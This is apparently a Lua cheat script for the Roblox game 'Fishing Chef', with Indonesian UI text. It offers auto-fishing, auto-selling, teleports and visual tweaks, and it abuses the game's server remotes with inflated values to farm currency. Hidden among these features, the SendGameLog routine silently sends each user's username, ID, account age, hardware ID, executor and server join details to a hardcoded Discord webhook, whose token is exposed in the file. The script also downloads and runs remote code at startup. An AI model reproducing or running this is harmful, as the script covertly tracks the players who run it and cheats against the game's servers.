--[[
    Mizukage Official - Fishing Chef Hub v2.0
    Base: Trollge Hub Template (WindUI)
    Tanpa Key System | Full Deskripsi & Detail Fitur
--]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizukageFishingLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Mizukage Official",
        Text = "Sistem sudah beroperasi di memori!"
    })
end
getgenv().MizukageFishingLoaded = true

-- ================================================
-- SERVICES & INITIALIZATION
-- ================================================
local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s; return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local Lighting = Services.Lighting

-- Fishing Chef Remotes (Knit Framework)
local ReplicatedStorage = Services.ReplicatedStorage
local Packages = ReplicatedStorage:WaitForChild("Packages")
local Knit = Packages:WaitForChild("Knit")
local FishService = Knit:WaitForChild("Services"):WaitForChild("Fish")

local RF = FishService:WaitForChild("RF")
local RE = FishService:WaitForChild("RE")

local Remotes = {
    CastRequest = RF:WaitForChild("CastRequest"),
    MinigameResolved = RF:WaitForChild("MinigameResolved"),
    SellFish = RE:WaitForChild("SellFish"),
}

-- ================================================
-- SYSTEM LOGIC (AUTO RECONNECT & WEBHOOK)
-- ================================================
local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    local virtualUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end

local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId
        local HWID = "Unknown"
        pcall(function() if gethwid then HWID = gethwid() elseif identifying then HWID = identifying() end end)

        local AvatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
            if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
        end)

        local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local GameName = "Fishing Chef"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        
        local EmbedColor = (Membership == "Premium") and 16766720 or 65280
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            ["username"] = "Mizukage Logger",
            ["avatar_url"] = AvatarURL,
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "👑 " .. GameName .. " | LOG REPORT",
                ["url"] = ProfileLink,
                ["color"] = EmbedColor,
                ["thumbnail"] = { ["url"] = AvatarURL },
                ["fields"] = {
                    { ["name"] = "👤 **USER INFORMATION**", ["value"] = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", DisplayName, Username, ProfileLink, UserId, AccountAge), ["inline"] = true },
                    { ["name"] = "🛡️ **HARDWARE ID (HWID)**", ["value"] = "```" .. HWID .. "```", ["inline"] = true },
                    { ["name"] = "📡 **DEVICE INFO**", ["value"] = string.format("> **Exe:** `%s`\n> **Platform:** `%s`", Executor, Platform), ["inline"] = false },
                    { ["name"] = "🔓 **QUICK JOIN**", ["value"] = "```lua\n" .. JoinScript .. "```", ["inline"] = false }
                },
                ["footer"] = { ["text"] = "Mizukage Logger", ["icon_url"] = AvatarURL },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(Data) })
    end)
end

-- ================================================
-- CORE MODULE: FISHING CHEF LOGIC
-- ================================================
local Config = {
    AutoFish = false,
    AutoSell = false,
    WalkSpeed = 16,
    JumpPower = 50
}

local Locations = {
    ["Moon Tuna Hunt"]      = Vector3.new(60, 10, -858),
    ["Moon Tuna Islands 2"] = Vector3.new(-166, 9, -817),
    ["Moon Tuna Islands 3"] = Vector3.new(40, 8, -586),
    ["Koi Pond"]            = Vector3.new(-88, 11, -1350),
    ["Shark Hunt"]          = Vector3.new(-16, 4, 325),
    ["Bamboo Islands"]      = Vector3.new(-2359, 4, -928),
    ["Snow Islands"]        = Vector3.new(-3743, 6, 1484),
    ["Location 1"]          = Vector3.new(-112.332, 2.689, -1336.005),
    ["Location 2"]          = Vector3.new(-3875.299, 38.839, 1557.888),
    ["Location 3"]          = Vector3.new(-1315.62, 37.832, 1635.639),
    ["Location 4 (Ocean)"]  = Vector3.new(-2.137, 23.07, 175.539)
}

local function ToggleAutoFish(state)
    Config.AutoFish = state
    if state then
        task.spawn(function()
            while Config.AutoFish do
                pcall(function()
                    Remotes.CastRequest:InvokeServer(99999999999)
                end)
                task.wait(3)
                pcall(function()
                    Remotes.MinigameResolved:InvokeServer(true)
                end)
                task.wait(1)
            end
        end)
    end
end

local function ToggleAutoSell(state)
    Config.AutoSell = state
    if state then
        task.spawn(function()
            while Config.AutoSell do
                pcall(function()
                    for fishID = 1, 372 do
                        Remotes.SellFish:FireServer({
                            { ["ID"] = fishID, ["Name"] = "fish", ["Weight"] = 9999999999 }
                        })
                        task.wait(0.005)
                        if not Config.AutoSell then break end
                    end
                end)
                task.wait(0.5)
            end
        end)
    end
end

local function TeleportTo(targetName)
    local targetPosition = Locations[targetName]
    local char = LocalPlayer.Character
    if targetPosition and char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
    end
end

local function ApplyVisuals(type, state)
    if type == "Fullbright" then
        if state then
            Lighting.Brightness = 2
            Lighting.GlobalShadows = false
            Lighting.Ambient = Color3.new(1, 1, 1)
            Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
        else
            Lighting.Brightness = 1
            Lighting.GlobalShadows = true
            Lighting.Ambient = Color3.fromRGB(70, 70, 70)
            Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
        end
    elseif type == "NoFog" then
        if state then
            Lighting.FogEnd = 1e8
            Lighting.FogStart = 1e8
        else
            Lighting.FogEnd = 10000
            Lighting.FogStart = 0
        end
    end
end

local function CleanupAll()
    Config.AutoFish = false
    Config.AutoSell = false
    ApplyVisuals("Fullbright", false)
    ApplyVisuals("NoFog", false)
end

-- ================================================
-- WIND UI - PREMIUM INTERFACE
-- ================================================
local function InitInterface()
    local success, WindUI = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    if not success or not WindUI then
        success, WindUI = pcall(function()
            return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))()
        end)
    end
    if not success or not WindUI then
        warn("WindUI gagal dimuat.")
        return
    end

    local Sounds = { StartupId = "rbxassetid://140397610798305", ClickId = "rbxassetid://140277245983305" }
    pcall(function() Services.ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)
    function Sounds:Play(id, volume) task.spawn(function() local s = Instance.new("Sound"); s.SoundId = id; s.Volume = volume or 1; s.Parent = Services.SoundService; s.Ended:Connect(function() s:Destroy() end); s:Play() end) end
    function Sounds:Startup() self:Play(Sounds.StartupId, 1) end
    function Sounds:Click() self:Play(Sounds.ClickId, 0.8) end
    Sounds:Startup()

    WindUI:Notify({
        Title = "Mizukage Official",
        Content = "Fishing Chef Hub berhasil dimuat! Selamat menggunakan.",
        Duration = 6,
        Icon = "fish"
    })

    local ViewportSize = Workspace.CurrentCamera.ViewportSize
    local isMobile = ViewportSize.X < 850
    local dynamicSize = isMobile and UDim2.fromOffset(ViewportSize.X * 0.85, ViewportSize.Y * 0.85) or UDim2.fromOffset(600, 480)
    local dynamicSideBar = isMobile and 150 or 210

    local Window = WindUI:CreateWindow({
        Title = "FISHING CHEF",
        Icon = "lucide:waves",
        Author = "Mizukage Official 👑",
        Folder = "MizukageFishing",
        Size = dynamicSize,
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(0, 150, 255), -- Warna laut/biru
        SideBarWidth = dynamicSideBar,
        HasOutline = true,
        Background = "rbxassetid://137490169052447",
        BackgroundImageTransparency = 0.85
    })

    Window:Tag({ Title = "Premium", Icon = "lucide:crown", Color = Color3.fromHex("#ffb300"), Radius = 6 })

    local TabHome = Window:Tab({ Title = "Home", Icon = "lucide:home" })
    local TabFarm = Window:Tab({ Title = "Farming", Icon = "lucide:fish" })
    local TabTeleport = Window:Tab({ Title = "Teleport", Icon = "lucide:map-pin" })
    local TabMisc = Window:Tab({ Title = "Visuals & Player", Icon = "lucide:user" })
    local TabSettings = Window:Tab({ Title = "Settings", Icon = "lucide:settings" })

    -- ==================== HOME TAB ====================
    TabHome:Section({ Title = "Informasi Game" })
    TabHome:Label("Game: Fishing Chef")
    TabHome:Label("Server: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. " pemain")
    TabHome:Label("Ping: ~" .. math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms")

    TabHome:Section({ Title = "Selamat Datang" })
    TabHome:Label("Hai, " .. LocalPlayer.DisplayName .. "!")
    TabHome:Label("Gunakan fitur di bawah untuk kaya raya dengan cepat.")

    -- ==================== TAB FARMING ====================
    TabFarm:Section({ Title = "Otomatisasi Memancing", Desc = "Tinggalkan AFK dan biarkan script berkerja" })
    TabFarm:Toggle({
        Title = "Auto Fishing",
        Desc = "Melemparkan kail dan menyelesaikan minigame secara otomatis berulang-ulang tanpa henti.",
        Default = false,
        Callback = function(v) Sounds:Click(); ToggleAutoFish(v) end
    })

    TabFarm:Section({ Title = "Otomatisasi Penjualan", Desc = "Jual ikan langsung dari inventaris" })
    TabFarm:Toggle({
        Title = "Auto Sell All Fish",
        Desc = "Menjual seluruh ikan (Dari ID 1 hingga 372) secara instan ke server. Mendapatkan koin dengan cepat.",
        Default = false,
        Callback = function(v) Sounds:Click(); ToggleAutoSell(v) end
    })

    -- ==================== TAB TELEPORT ====================
    TabTeleport:Section({ Title = "Lokasi Pemancingan Utama", Desc = "Pergi ke berbagai lokasi memancing secara instan" })
    
    local MainLocations = {"Moon Tuna Hunt", "Koi Pond", "Shark Hunt", "Bamboo Islands", "Snow Islands"}
    for _, loc in ipairs(MainLocations) do
        TabTeleport:Button({
            Title = "Teleport ke " .. loc,
            Desc = "Berpindah secara instan ke area " .. loc,
            Variant = "Secondary",
            Callback = function() Sounds:Click(); TeleportTo(loc) end
        })
    end

    TabTeleport:Section({ Title = "Lokasi Rahasia / Lainnya", Desc = "Lokasi tambahan untuk hunting spesifik" })
    local OtherLocations = {"Moon Tuna Islands 2", "Moon Tuna Islands 3", "Location 1", "Location 2", "Location 3", "Location 4 (Ocean)"}
    for _, loc in ipairs(OtherLocations) do
        TabTeleport:Button({
            Title = loc,
            Desc = "Pindah ke titik kordinat " .. loc,
            Variant = "Secondary",
            Callback = function() Sounds:Click(); TeleportTo(loc) end
        })
    end

    -- ==================== TAB MISC ====================
    TabMisc:Section({ Title = "Player Movement", Desc = "Ubah kecepatan karaktermu" })
    TabMisc:Slider({
        Title = "Walk Speed",
        Desc = "Mengatur kecepatan lari karakter. Hati-hati jika terlalu cepat.",
        Default = 16,
        Min = 16,
        Max = 100,
        Callback = function(v)
            Config.WalkSpeed = v
            local char = LocalPlayer.Character
            if char and char:FindFirstChildOfClass("Humanoid") then
                char:FindFirstChildOfClass("Humanoid").WalkSpeed = v
            end
        end
    })

    TabMisc:Slider({
        Title = "Jump Power",
        Desc = "Mengatur seberapa tinggi karaktermu bisa melompat.",
        Default = 50,
        Min = 50,
        Max = 200,
        Callback = function(v)
            Config.JumpPower = v
            local char = LocalPlayer.Character
            if char and char:FindFirstChildOfClass("Humanoid") then
                char:FindFirstChildOfClass("Humanoid").JumpPower = v
            end
        end
    })

    TabMisc:Section({ Title = "World Visuals", Desc = "Modifikasi visual dunia agar lebih jelas" })
    TabMisc:Toggle({
        Title = "Fullbright",
        Desc = "Menghapus bayangan dan membuat seluruh map menjadi sangat terang.",
        Default = false,
        Callback = function(v) Sounds:Click(); ApplyVisuals("Fullbright", v) end
    })
    TabMisc:Toggle({
        Title = "No Fog",
        Desc = "Menghilangkan kabut laut sehingga pandangan jarak jauh menjadi sangat jernih.",
        Default = false,
        Callback = function(v) Sounds:Click(); ApplyVisuals("NoFog", v) end
    })

    -- ==================== TAB SETTINGS ====================
    TabSettings:Section({ Title = "Informasi Script" })
    TabSettings:Label("Versi: v2.0 Premium")
    TabSettings:Label("Dibuat oleh: Mizukage Official")
    TabSettings:Label("Discord: discord.gg/mizukage")

    TabSettings:Section({ Title = "Sesi & Keamanan" })
    TabSettings:Button({
        Title = "Rejoin Server",
        Desc = "Bergabung kembali ke server yang sama. Berguna jika terjadi bug atau ingin reset posisi.",
        Variant = "Primary",
        Callback = function()
            Sounds:Click()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end
    })

    TabSettings:Button({
        Title = "Unload Script",
        Desc = "Matikan seluruh cheat dan hapus GUI. Kembalikan semua ke normal.",
        Variant = "Danger",
        Callback = function()
            Sounds:Click()
            WindUI:Popup({
                Title = "Konfirmasi Unload",
                Icon = "alert-triangle",
                Content = "Yakin ingin menutup semua fitur? Semua perubahan akan dikembalikan.",
                Buttons = {
                    { Title = "Batal", Callback = function() end, Variant = "Tertiary" },
                    { Title = "Lanjutkan", Icon = "check", Callback = function()
                        CleanupAll()
                        getgenv().MizukageFishingLoaded = false
                        WindUI:Destroy()
                    end, Variant = "Primary" }
                }
            })
        end
    })
end

-- ================================================
-- EKSEKUSI UTAMA
-- ================================================
SetupAutoReconnect()
SendGameLog()
task.spawn(InitInterface)